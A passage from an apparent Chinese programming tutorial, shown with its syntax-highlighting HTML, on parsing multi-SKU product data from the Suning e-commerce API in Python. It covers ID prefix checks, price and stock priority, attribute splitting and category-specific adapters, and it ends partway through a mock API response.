    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"skuInfo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>  <span class="hljs-comment">// SKU子信息（多个）</span>
      <span class="hljs-attr">"skuList"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"skuCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976512"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// SKU唯一ID</span>
          <span class="hljs-attr">"skuAttr"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色+12GB+256GB"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// SKU属性组合</span>
          <span class="hljs-attr">"salePrice"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3999.0</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// SKU单独售价</span>
          <span class="hljs-attr">"stockCount"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span>             <span class="hljs-comment">// SKU单独库存</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"skuCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976513"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"skuAttr"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"白色+12GB+512GB"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"salePrice"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4299.0</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"stockCount"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">150</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"attributeInfo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>  <span class="hljs-comment">// 商品静态属性（补充规格维度说明）</span>
      <span class="hljs-attr">"attributeList"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"机身颜色"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色;白色;蓝色"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"存储容量"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"256GB;512GB;1TB"</span><span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-2">核心关联逻辑</h4>
<ol>
<li><strong>主键关联</strong>：<code>productCode</code>（商品主 ID）是所有 SKU 的父级标识，SKU 编码通常以商品主 ID 为前缀（如<code>100032189765</code> + <code>12</code> = <code>10003218976512</code>）；</li>
<li><strong>属性关联</strong>：<code>skuAttr</code>（SKU 属性组合）对应<code>attributeInfo</code>中的静态属性维度（如颜色、存储、尺寸等）；</li>
<li><strong>价格 / 库存关联</strong>：SKU 级的价格 / 库存优先级高于商品主信息的价格 / 库存（部分 SKU 有单独定价）。</li>
</ol>
<h3 data-id="heading-3">二、SKU 关联逻辑拆解与验证</h3>
<h4 data-id="heading-4">1. 主键关联规则（通用）</h4>
<p>苏宁 SKU 编码生成遵循「商品主 ID + 规格序号」的规则，不同品类的序号长度不同（1-3 位），验证逻辑如下：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_sku_product_relation</span>(<span class="hljs-params">product_code: <span class="hljs-built_in">str</span>, sku_code: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""
    验证SKU与商品主ID的关联关系
    :param product_code: 商品主ID
    :param sku_code: SKU编码
    :return: 是否关联
    """</span>
    <span class="hljs-comment"># 规则1：SKU编码以商品主ID为前缀</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sku_code.startswith(product_code):
        <span class="hljs-comment"># 兼容部分品类SKU编码前缀省略末尾0的情况（如商品主ID=100032189760，SKU=1000321897612）</span>
        <span class="hljs-keyword">if</span> sku_code.startswith(product_code.rstrip(<span class="hljs-string">"0"</span>)):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-comment"># 规则2：前缀后至少1位规格序号</span>
    seq_part = sku_code[<span class="hljs-built_in">len</span>(product_code):]
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(seq_part) &gt;= <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> seq_part.isdigit()

<span class="hljs-comment"># 测试验证</span>
product_code = <span class="hljs-string">"100032189765"</span>
sku_code_valid = <span class="hljs-string">"10003218976512"</span>
sku_code_invalid = <span class="hljs-string">"10003218988812"</span>
<span class="hljs-built_in">print</span>(verify_sku_product_relation(product_code, sku_code_valid))  <span class="hljs-comment"># True</span>
<span class="hljs-built_in">print</span>(verify_sku_product_relation(product_code, sku_code_invalid))  <span class="hljs-comment"># False</span>
</code></pre>
<h4 data-id="heading-5">2. 价格 / 库存关联优先级</h4>
<p>SKU 级价格 / 库存是实际可售数据，解析时需优先使用 SKU 维度数据，规则如下：</p>






























<table><thead><tr><th>数据维度</th><th>优先级</th><th>适用场景</th></tr></thead><tbody><tr><td>SKU 售价</td><td>最高</td><td>下单定价、价格监控</td></tr><tr><td>商品主售价</td><td>次高</td><td>无 SKU 单独定价时兜底</td></tr><tr><td>SKU 库存</td><td>最高</td><td>库存预警、可售判断</td></tr><tr><td>商品主库存</td><td>次高</td><td>无 SKU 单独库存时兜底</td></tr></tbody></table>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sku_effective_price</span>(<span class="hljs-params">sku_data: <span class="hljs-built_in">dict</span>, product_price: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    获取SKU有效售价（优先SKU售价，无则用商品主售价）
    :param sku_data: SKU单条数据
    :param product_price: 商品主售价
    :return: 有效售价
    """</span>
    sku_price = <span class="hljs-built_in">float</span>(sku_data.get(<span class="hljs-string">"salePrice"</span>, <span class="hljs-number">0.0</span>))
    <span class="hljs-keyword">return</span> sku_price <span class="hljs-keyword">if</span> sku_price &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> product_price

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sku_effective_stock</span>(<span class="hljs-params">sku_data: <span class="hljs-built_in">dict</span>, product_stock: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""
    获取SKU有效库存（优先SKU库存，无则用商品主库存）
    :param sku_data: SKU单条数据
    :param product_stock: 商品主库存
    :return: 有效库存
    """</span>
    sku_stock = sku_data.get(<span class="hljs-string">"stockCount"</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># 处理苏宁库存格式（如"200+"→200，"无货"→0）</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(sku_stock, <span class="hljs-built_in">str</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-string">"+"</span> <span class="hljs-keyword">in</span> sku_stock:
            sku_stock = <span class="hljs-built_in">int</span>(sku_stock.replace(<span class="hljs-string">"+"</span>, <span class="hljs-string">""</span>))
        <span class="hljs-keyword">elif</span> sku_stock <span class="hljs-keyword">in</span> [<span class="hljs-string">"无货"</span>, <span class="hljs-string">"缺货"</span>]:
            sku_stock = <span class="hljs-number">0</span>
        <span class="hljs-keyword">else</span>:
            sku_stock = <span class="hljs-built_in">int</span>(sku_stock) <span class="hljs-keyword">if</span> sku_stock.isdigit() <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> sku_stock <span class="hljs-keyword">if</span> sku_stock &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> product_stock
</code></pre>
<h3 data-id="heading-6">三、属性值提取核心技巧（适配多格式）</h3>
<p>苏宁不同品类的<code>skuAttr</code>格式差异极大，是解析的核心痛点，以下是通用提取技巧：</p>
<h4 data-id="heading-7">1. 多分隔符适配（解决格式不统一）</h4>
<p><code>skuAttr</code>常见分隔符包括<code>+</code>、<code>/</code>、<code>|</code>、<code>；</code>、空格等，需适配所有分隔符拆分属性：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> re

<span class="hljs-keyword">def</span> <span class="hljs-title function_">split_sku_attr</span>(<span class="hljs-params">sku_attr: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">list</span>:
    <span class="hljs-string">"""
    拆分SKU属性字符串（适配多分隔符）
    :param sku_attr: SKU属性字符串（如"黑色+12GB+256GB"、"白色/512GB"）
    :return: 拆分后的属性值列表
    """</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sku_attr:
        <span class="hljs-keyword">return</span> []
    <span class="hljs-comment"># 正则匹配所有常见分隔符，统一替换为+后拆分</span>
    attr_str = re.sub(<span class="hljs-string">r"[/|；\s]"</span>, <span class="hljs-string">"+"</span>, sku_attr)
    <span class="hljs-comment"># 去重空值、去重重复属性</span>
    attr_list = [attr.strip() <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> attr_str.split(<span class="hljs-string">"+"</span>) <span class="hljs-keyword">if</span> attr.strip()]
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(attr_list))

<span class="hljs-comment"># 测试多格式拆分</span>
test_attrs = [
    <span class="hljs-string">"黑色+12GB+256GB"</span>,
    <span class="hljs-string">"白色/512GB"</span>,
    <span class="hljs-string">"蓝色 | 8GB | 128GB"</span>,
    <span class="hljs-string">"红色；256GB"</span>
]
<span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> test_attrs:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"原始：<span class="hljs-subst">{attr}</span> → 拆分：<span class="hljs-subst">{split_sku_attr(attr)}</span>"</span>)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 原始：黑色+12GB+256GB → 拆分：['黑色', '12GB', '256GB']</span>
<span class="hljs-comment"># 原始：白色/512GB → 拆分：['白色', '512GB']</span>
<span class="hljs-comment"># 原始：蓝色 | 8GB | 128GB → 拆分：['蓝色', '8GB', '128GB']</span>
<span class="hljs-comment"># 原始：红色；256GB → 拆分：['红色', '256GB']</span>
</code></pre>
<h4 data-id="heading-8">2. 规格维度自动匹配（核心技巧）</h4>
<p>拆分后的属性值需匹配到具体维度（如颜色、内存、存储、尺寸等），需结合<code>attributeInfo</code>中的静态属性维度实现自动匹配：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">match_sku_attr_dimension</span>(<span class="hljs-params">sku_attr_list: <span class="hljs-built_in">list</span>, product_attr_list: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""
    将SKU属性值匹配到具体维度（如颜色、存储）
    :param sku_attr_list: 拆分后的SKU属性值列表
    :param product_attr_list: 商品静态属性列表（来自attributeInfo）
    :return: 维度→属性值的字典
    """</span>
    <span class="hljs-comment"># 步骤1：提取商品静态属性的维度（如机身颜色、存储容量）</span>
    attr_dimensions = {}
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> product_attr_list:
        attr_name = attr.get(<span class="hljs-string">"attrName"</span>, <span class="hljs-string">""</span>).strip()
        attr_value = attr.get(<span class="hljs-string">"attrValue"</span>, <span class="hljs-string">""</span>).strip()
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> attr_value:
            <span class="hljs-keyword">continue</span>
        <span class="hljs-comment"># 标准化维度名称（统一关键词）</span>
        std_dim = <span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"颜色"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"颜色"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"内存"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-string">"运行内存"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"内存"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"存储"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-string">"容量"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">and</span> <span class="hljs-string">"GB"</span> <span class="hljs-keyword">in</span> attr_value:
            std_dim = <span class="hljs-string">"存储"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"尺寸"</span> <span class="hljs-keyword">in</span> attr_name <span class="hljs-keyword">or</span> <span class="hljs-string">"尺码"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"尺寸"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"功率"</span> <span class="hljs-keyword">in</span> attr_name:
            std_dim = <span class="hljs-string">"功率"</span>
        <span class="hljs-keyword">if</span> std_dim:
            <span class="hljs-comment"># 提取该维度的所有可选值（如黑色;白色;蓝色→["黑色","白色","蓝色"]）</span>
            attr_dimensions[std_dim] = [v.strip() <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> attr_value.split(<span class="hljs-string">";"</span>)]
    
    <span class="hljs-comment"># 步骤2：将SKU属性值匹配到标准化维度</span>
    sku_attr_dict = {}
    <span class="hljs-keyword">for</span> attr_value <span class="hljs-keyword">in</span> sku_attr_list:
        matched = <span class="hljs-literal">False</span>
        <span class="hljs-keyword">for</span> dim, dim_values <span class="hljs-keyword">in</span> attr_dimensions.items():
            <span class="hljs-keyword">if</span> attr_value <span class="hljs-keyword">in</span> dim_values:
                sku_attr_dict[dim] = attr_value
                matched = <span class="hljs-literal">True</span>
                <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># 未匹配到预设维度时，自动识别（如含GB的是存储/内存，颜色关键词）</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> matched:
            <span class="hljs-keyword">if</span> <span class="hljs-string">"GB"</span> <span class="hljs-keyword">in</span> attr_value:
                <span class="hljs-keyword">if</span> attr_value <span class="hljs-keyword">in</span> [<span class="hljs-string">"8GB"</span>, <span class="hljs-string">"12GB"</span>, <span class="hljs-string">"16GB"</span>]:
                    sku_attr_dict[<span class="hljs-string">"内存"</span>] = attr_value
                <span class="hljs-keyword">else</span>:
                    sku_attr_dict[<span class="hljs-string">"存储"</span>] = attr_value
            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">any</span>(color <span class="hljs-keyword">in</span> attr_value <span class="hljs-keyword">for</span> color <span class="hljs-keyword">in</span> [<span class="hljs-string">"黑色"</span>, <span class="hljs-string">"白色"</span>, <span class="hljs-string">"红色"</span>, <span class="hljs-string">"蓝色"</span>, <span class="hljs-string">"绿色"</span>]):
                sku_attr_dict[<span class="hljs-string">"颜色"</span>] = attr_value
            <span class="hljs-keyword">else</span>:
                sku_attr_dict[<span class="hljs-string">"其他规格"</span>] = attr_value
    <span class="hljs-keyword">return</span> sku_attr_dict

<span class="hljs-comment"># 测试维度匹配</span>
product_attr_list = [
    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"机身颜色"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"黑色;白色;蓝色"</span>},
    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"存储容量"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"256GB;512GB;1TB"</span>},
    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"运行内存"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"8GB;12GB;16GB"</span>}
]
sku_attr_list = [<span class="hljs-string">"黑色"</span>, <span class="hljs-string">"12GB"</span>, <span class="hljs-string">"256GB"</span>]
<span class="hljs-built_in">print</span>(match_sku_attr_dimension(sku_attr_list, product_attr_list))
<span class="hljs-comment"># 输出：{'颜色': '黑色', '内存': '12GB', '存储': '256GB'}</span>
</code></pre>
<h4 data-id="heading-9">3. 特殊品类适配（服饰 / 家电）</h4>
<h5 data-id="heading-10">3.1 服饰类（尺码 / 颜色为主）</h5>
<p>服饰类<code>skuAttr</code>常为「颜色 - 尺码」格式（如 "黑色 - L 码"），需适配尺码维度识别：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">adapt_clothing_sku_attr</span>(<span class="hljs-params">sku_attr_list: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""适配服饰类SKU属性解析"""</span>
    size_keywords = [<span class="hljs-string">"XS"</span>, <span class="hljs-string">"S"</span>, <span class="hljs-string">"M"</span>, <span class="hljs-string">"L"</span>, <span class="hljs-string">"XL"</span>, <span class="hljs-string">"XXL"</span>, <span class="hljs-string">"XXXL"</span>, <span class="hljs-string">"码"</span>, <span class="hljs-string">"号"</span>]
    color_keywords = [<span class="hljs-string">"黑"</span>, <span class="hljs-string">"白"</span>, <span class="hljs-string">"红"</span>, <span class="hljs-string">"蓝"</span>, <span class="hljs-string">"绿"</span>, <span class="hljs-string">"粉"</span>, <span class="hljs-string">"黄"</span>, <span class="hljs-string">"紫"</span>]
    
    sku_attr_dict = {}
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> sku_attr_list:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> size_keywords):
            sku_attr_dict[<span class="hljs-string">"尺码"</span>] = attr
        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> color_keywords):
            sku_attr_dict[<span class="hljs-string">"颜色"</span>] = attr
        <span class="hljs-keyword">else</span>:
            sku_attr_dict[<span class="hljs-string">"版型"</span>] = attr  <span class="hljs-comment"># 如宽松、修身</span>
    <span class="hljs-keyword">return</span> sku_attr_dict

<span class="hljs-comment"># 测试服饰适配</span>
clothing_attr_list = [<span class="hljs-string">"黑色"</span>, <span class="hljs-string">"XL码"</span>]
<span class="hljs-built_in">print</span>(adapt_clothing_sku_attr(clothing_attr_list))  <span class="hljs-comment"># {'颜色': '黑色', '尺码': 'XL码'}</span>
</code></pre>
<h5 data-id="heading-11">3.2 家电类（功率 / 尺寸为主）</h5>
<p>家电类<code>skuAttr</code>含功率、尺寸等数值型属性，需标准化单位：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">adapt_appliance_sku_attr</span>(<span class="hljs-params">sku_attr_list: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""适配家电类SKU属性解析"""</span>
    sku_attr_dict = {}
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> sku_attr_list:
        <span class="hljs-keyword">if</span> <span class="hljs-string">"W"</span> <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">or</span> <span class="hljs-string">"千瓦"</span> <span class="hljs-keyword">in</span> attr:
            <span class="hljs-comment"># 统一单位为W（如"1.5千瓦"→"1500W"）</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"千瓦"</span> <span class="hljs-keyword">in</span> attr:
                kw = <span class="hljs-built_in">float</span>(attr.replace(<span class="hljs-string">"千瓦"</span>, <span class="hljs-string">""</span>).strip())
                attr = <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">int</span>(kw*<span class="hljs-number">1000</span>)}</span>W"</span>
            sku_attr_dict[<span class="hljs-string">"功率"</span>] = attr
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"mm"</span> <span class="hljs-keyword">in</span> attr <span class="hljs-keyword">or</span> <span class="hljs-string">"cm"</span> <span class="hljs-keyword">in</span> attr:
            <span class="hljs-comment"># 统一单位为mm（如"60cm"→"600mm"）</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"cm"</span> <span class="hljs-keyword">in</span> attr:
                cm = <span class="hljs-built_in">float</span>(attr.replace(<span class="hljs-string">"cm"</span>, <span class="hljs-string">""</span>).strip())
                attr = <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">int</span>(cm*<span class="hljs-number">10</span>)}</span>mm"</span>
            sku_attr_dict[<span class="hljs-string">"尺寸"</span>] = attr
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"升"</span> <span class="hljs-keyword">in</span> attr:
            sku_attr_dict[<span class="hljs-string">"容量"</span>] = attr
    <span class="hljs-keyword">return</span> sku_attr_dict

<span class="hljs-comment"># 测试家电适配</span>
appliance_attr_list = [<span class="hljs-string">"1.5千瓦"</span>, <span class="hljs-string">"60cm"</span>]
<span class="hljs-built_in">print</span>(adapt_appliance_sku_attr(appliance_attr_list))  <span class="hljs-comment"># {'功率': '1500W', '尺寸': '600mm'}</span>
</code></pre>
<h3 data-id="heading-12">四、完整解析实战（多规格商品）</h3>
<h4 data-id="heading-13">1. 全流程解析函数</h4>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_extract_field</span>(<span class="hljs-params">data: <span class="hljs-type">Dict</span>, field_path: <span class="hljs-built_in">str</span>, default: <span class="hljs-built_in">any</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">any</span>:
    <span class="hljs-string">"""安全提取嵌套字段"""</span>
    keys = field_path.split(<span class="hljs-string">"."</span>)
    value = data
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> key <span class="hljs-keyword">in</span> value:
            value = value[key]
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> default
    <span class="hljs-keyword">return</span> value

<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_suning_multi_sku_product</span>(<span class="hljs-params">raw_api_data: <span class="hljs-type">Dict</span></span>) -&gt; <span class="hljs-type">Dict</span>:
    <span class="hljs-string">"""
    全流程解析苏宁多规格商品API数据
    :param raw_api_data: API原始响应数据
    :return: 标准化的多规格商品数据
    """</span>
    <span class="hljs-comment"># 1. 提取基础信息</span>
    product_code = safe_extract_field(raw_api_data, <span class="hljs-string">"body.productInfo.productCode"</span>, <span class="hljs-string">""</span>)
    product_name = safe_extract_field(raw_api_data, <span class="hljs-string">"body.productInfo.productName"</span>, <span class="hljs-string">""</span>)
    product_price = <span class="hljs-built_in">float</span>(safe_extract_field(raw_api_data, <span class="hljs-string">"body.priceInfo.salePrice"</span>, <span class="hljs-number">0.0</span>))
    product_stock = safe_extract_field(raw_api_data, <span class="hljs-string">"body.stockInfo.stockCount"</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># 处理商品主库存格式</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(product_stock, <span class="hljs-built_in">str</span>):
        product_stock = <span class="hljs-built_in">int</span>(product_stock.replace(<span class="hljs-string">"+"</span>, <span class="hljs-string">""</span>)) <span class="hljs-keyword">if</span> <span class="hljs-string">"+"</span> <span class="hljs-keyword">in</span> product_stock <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>

    <span class="hljs-comment"># 2. 提取商品静态属性列表</span>
    product_attr_list = safe_extract_field(raw_api_data, <span class="hljs-string">"body.attributeInfo.attributeList"</span>, [])

    <span class="hljs-comment"># 3. 提取SKU列表并解析</span>
    sku_list = safe_extract_field(raw_api_data, <span class="hljs-string">"body.skuInfo.skuList"</span>, [])
    parsed_skus = []
    <span class="hljs-keyword">for</span> sku <span class="hljs-keyword">in</span> sku_list:
        sku_code = sku.get(<span class="hljs-string">"skuCode"</span>, <span class="hljs-string">""</span>)
        sku_attr_str = sku.get(<span class="hljs-string">"skuAttr"</span>, <span class="hljs-string">""</span>)
        
        <span class="hljs-comment"># 验证SKU与商品主ID的关联</span>
        is_related = verify_sku_product_relation(product_code, sku_code)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_related:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"SKU <span class="hljs-subst">{sku_code}</span> 与商品 <span class="hljs-subst">{product_code}</span> 无关联，跳过"</span>)
            <span class="hljs-keyword">continue</span>
        
        <span class="hljs-comment"># 拆分SKU属性</span>
        sku_attr_list = split_sku_attr(sku_attr_str)
        
        <span class="hljs-comment"># 匹配属性维度（优先用商品静态属性，无则自动识别）</span>
        sku_attr_dict = match_sku_attr_dimension(sku_attr_list, product_attr_list)
        <span class="hljs-comment"># 适配特殊品类（可根据商品类目选择适配函数）</span>
        category_name = safe_extract_field(raw_api_data, <span class="hljs-string">"body.productInfo.categoryName"</span>, <span class="hljs-string">""</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"服饰"</span> <span class="hljs-keyword">in</span> category_name:
            sku_attr_dict = adapt_clothing_sku_attr(sku_attr_list)
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"家电"</span> <span class="hljs-keyword">in</span> category_name <span class="hljs-keyword">or</span> <span class="hljs-string">"电器"</span> <span class="hljs-keyword">in</span> category_name:
            sku_attr_dict = adapt_appliance_sku_attr(sku_attr_list)
        
        <span class="hljs-comment"># 获取SKU有效价格和库存</span>
        sku_effective_price = get_sku_effective_price(sku, product_price)
        sku_effective_stock = get_sku_effective_stock(sku, product_stock)
        
        <span class="hljs-comment"># 组装SKU解析结果</span>
        parsed_sku = {
            <span class="hljs-string">"SKU编码"</span>: sku_code,
            <span class="hljs-string">"关联商品主ID"</span>: product_code,
            <span class="hljs-string">"属性维度"</span>: sku_attr_dict,
            <span class="hljs-string">"原始属性字符串"</span>: sku_attr_str,
            <span class="hljs-string">"有效售价(元)"</span>: <span class="hljs-built_in">round</span>(sku_effective_price, <span class="hljs-number">2</span>),
            <span class="hljs-string">"有效库存数"</span>: sku_effective_stock,
            <span class="hljs-string">"SKU状态"</span>: <span class="hljs-string">"可售"</span> <span class="hljs-keyword">if</span> sku.get(<span class="hljs-string">"skuStatus"</span>) == <span class="hljs-string">"1"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"不可售"</span>
        }
        parsed_skus.append(parsed_sku)

    <span class="hljs-comment"># 4. 组装最终结果</span>
    final_result = {
        <span class="hljs-string">"商品主信息"</span>: {
            <span class="hljs-string">"商品主ID"</span>: product_code,
            <span class="hljs-string">"商品名称"</span>: product_name,
            <span class="hljs-string">"商品主售价(元)"</span>: <span class="hljs-built_in">round</span>(product_price, <span class="hljs-number">2</span>),
            <span class="hljs-string">"商品主库存数"</span>: product_stock,
            <span class="hljs-string">"是否多规格"</span>: <span class="hljs-built_in">len</span>(parsed_skus) &gt; <span class="hljs-number">1</span>
        },
        <span class="hljs-string">"SKU列表"</span>: parsed_skus,
        <span class="hljs-string">"静态属性列表"</span>: product_attr_list
    }
    <span class="hljs-keyword">return</span> final_result

<span class="hljs-comment"># 2. 测试实战（模拟苏宁API返回数据）</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 模拟多规格手机商品API响应</span>
    mock_raw_data = {
        <span class="hljs-string">"code"</span>: <span class="hljs-string">"0000"</span>,
        <span class="hljs-string">"msg"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"body"</span>: {
            <span class="hljs-string">"productInfo"</span>: {
                <span class="hljs-string">"productCode"</span>: <span class="hljs-string">"100032189765"</span>,
                <span class="hljs-string">"productName"</span>: <span class="hljs-string">"小米14 5G手机【多规格】"</span>,
                <span class="hljs-string">"categoryName"</span>: <span class="hljs-string">"数码家电-手机通讯-5G手机"</span>
            },
            <span class="hljs-string">"priceInfo"</span>: {
                <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">3999.0</span>
            },
            <span class="hljs-string">"stockInfo"</span>: {
                <span class="hljs-string">"stockCount"</span>: <span class="hljs-string">"500+"</span>
            },
            <span class="hljs-string">"skuInfo"</span>: {
                <span class="hljs-string">"skuList"</span>: [
                    {
                        <span class="hljs-string">"skuCode"</span>: <span class="hljs-string">"10003218976512"</span>,
                        <span class="hljs-string">"skuAttr"</span>: <span class="hljs-string">"黑色+12GB+256GB"</span>,
                        <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">3999.0</span>,
                        <span class="hljs-string">"stockCount"</span>: <span class="hljs-string">"200+"</span>,
                        <span class="hljs-string">"skuStatus"</span>: <span class="hljs-string">"1"</span>
                    },
                    {
